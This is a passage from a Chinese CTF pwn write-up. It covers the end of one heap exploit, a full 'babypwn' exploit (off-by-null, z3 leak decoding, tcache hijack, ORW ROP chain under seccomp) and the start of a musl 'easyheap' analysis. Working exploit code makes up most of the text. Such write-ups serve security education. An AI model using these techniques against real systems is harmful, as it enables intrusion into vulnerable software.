class="line">dele(<span class="number">11</span>)</span><br><span class="line">dele(<span class="number">12</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x178</span>*<span class="string">&quot;\x00&quot;</span>+p64(<span class="number">0x211</span>)+p64(free_hook)+p64(free_hook)</span><br><span class="line">add(<span class="number">0x300</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x208</span>,p64(system))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babypwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">721</span>c84a30c78ecb82a98a6d484d884a502b54fd6, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>禁用 execve</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>程序在 edit 完后会将所有的 0x11 置空，但是没有限制范围：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">change</span><span class="params">(<span class="keyword">char</span> *chunk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *chunk == <span class="number">0x11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *chunk = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++chunk;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有 off-by-null 漏洞</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序的泄露模块需要逆向，先进行一波分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  a1 ^= (<span class="number">32</span> * a1) ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ ((a1 ^ (<span class="number">32</span> * a1)) &gt;&gt; <span class="number">17</span>)) &lt;&lt; <span class="number">13</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br></pre></td></tr></table></figure>
<p>直接使用 z3 求解，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">target</span>):</span></span><br><span class="line">    a1 = BitVec(<span class="string">&quot;a1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    x = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        a1 ^= (<span class="number">32</span> * a1) ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>)) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    x.add(target == a1)</span><br><span class="line">    <span class="keyword">if</span>(x.check()==sat):</span><br><span class="line">        model = <span class="built_in">str</span>(x.model())</span><br><span class="line">        <span class="built_in">print</span>(model)</span><br><span class="line">        pos, val = model.split(<span class="string">&#x27;=&#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">        re = <span class="built_in">eval</span>(val[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(re))</span><br><span class="line">    <span class="keyword">return</span> re</span><br></pre></td></tr></table></figure>
<ul>
<li>这里弄了好久，最后发现 z3 不能直接左移，要用对应的函数 LShR</li>
</ul>
<p>泄露 heap_base 很容易就能打 unlink 实现堆重叠，程序开了沙盒，需要使用堆上 ORW 的技术：</p>
<ul>
<li>限制了 size 大小（难以打 largebin attack），但通过劫持 tcache 可以打 IO</li>
<li>也可以通过 TLS 泄露栈地址，然后劫持 tcache 打栈</li>
</ul>
<p>这里我选择了后者（一般来说，程序如果限制 size 为 unsorted chunk 则选择前者，限制 size 为 tcache 就选择后者）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./babypwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0xFCB)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span> <span class="comment"># 17</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">target</span>):</span></span><br><span class="line">    a1 = BitVec(<span class="string">&quot;a1&quot;</span>,<span class="number">32</span>)</span><br><span class="line">    x = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        a1 ^= (<span class="number">32</span> * a1) ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>) ^ (((<span class="number">32</span> * a1) ^ a1 ^ LShR((a1 ^ (<span class="number">32</span> * a1)),<span class="number">17</span>)) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    x.add(target == a1)</span><br><span class="line">    <span class="keyword">if</span>(x.check()==sat):</span><br><span class="line">        model = <span class="built_in">str</span>(x.model())</span><br><span class="line">        <span class="built_in">print</span>(model)</span><br><span class="line">        pos, val = model.split(<span class="string">&#x27;=&#x27;</span>)[:<span class="number">2</span>]</span><br><span class="line">        re = <span class="built_in">eval</span>(val[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(re))</span><br><span class="line">    <span class="keyword">return</span> re</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">heap_base = leakaddr - <span class="number">0x670</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#0</span></span><br><span class="line">heap_addr = heap_base + <span class="number">0xf60</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x541</span>) </span><br><span class="line">payload += p64(heap_addr+<span class="number">0x30</span>)+p64(heap_addr+<span class="number">0x30</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(heap_addr+<span class="number">0x10</span>)+p64(heap_addr+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x108</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>+p64(<span class="number">0x540</span>)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i+<span class="number">7</span>)</span><br><span class="line">    </span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">libc_base = leakaddr - <span class="number">0x3ec120</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">61</span></span><br><span class="line">stack_libc = libc_base + <span class="number">0x5d1a40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    dele(<span class="number">4</span>-i)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0xb8</span>*<span class="string">&quot;a&quot;</span>+p64(<span class="number">0x111</span>)+p64(stack_libc)+p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr1 = decode(leakaddr)</span><br><span class="line">leakaddr = <span class="built_in">eval</span>(<span class="string">b&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">leakaddr2 = decode(leakaddr)</span><br><span class="line"></span><br><span class="line">leakaddr = leakaddr1 + leakaddr2 * <span class="number">0x100000000</span></span><br><span class="line">stack_base = leakaddr - <span class="number">0x1fc90</span></span><br><span class="line">success(<span class="string">&quot;leakaddr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leakaddr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base+<span class="number">0x000000000001b500</span></span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_ret = libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">syscall_ret = libc_base+<span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">payload = <span class="string">&quot;b&quot;</span>*<span class="number">0x1d8</span>+p64(<span class="number">0x100</span>)+p64(stack_base+<span class="number">0x1fc48</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(bss_addr,0)[4]</span></span><br><span class="line">payload =  <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(4,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base+<span class="number">0x1fd20</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">easyheap: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so<span class="number">.1</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>程序给了一个 libc.so，一番查找后发现这是一个 musl libc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn ./libc.<span class="function">so        </span></span><br><span class="line"><span class="function">musl <span class="title">libc</span> <span class="params">(x86_64)</span></span></span><br><span class="line"><span class="function">Version 1.2.2</span></span><br><span class="line"><span class="function">Dynamic Program Loader</span></span><br><span class="line"><span class="function">Usage: ./libc.so [options] [--] pathname [args]</span></span><br></pre></td></tr></table></figure>
<ul>
<li>PS：musl 只有一个 libc，即作为 libc 也是 ld</li>
</ul>
<p>对于 musl libc，patchelf 是无效的，需要将题目提供的 libc.so 复制到对应的目录：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp libc.so /usr/lib/x86_64-linux-musl/libc.so</span><br></pre></td></tr></table></figure>
<p><strong>程序分析</strong></p>
<p>想要开启程序核心功能必须先逆向解密：</p>
